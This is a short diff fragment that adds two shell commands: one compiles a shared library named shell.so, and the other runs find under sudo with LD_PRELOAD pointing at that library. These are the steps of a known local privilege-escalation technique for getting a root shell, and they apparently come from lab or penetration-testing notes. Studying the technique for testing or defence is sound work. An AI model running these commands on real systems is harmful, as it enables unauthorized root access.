@@ -1,0 +1,4 @@
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
+
+
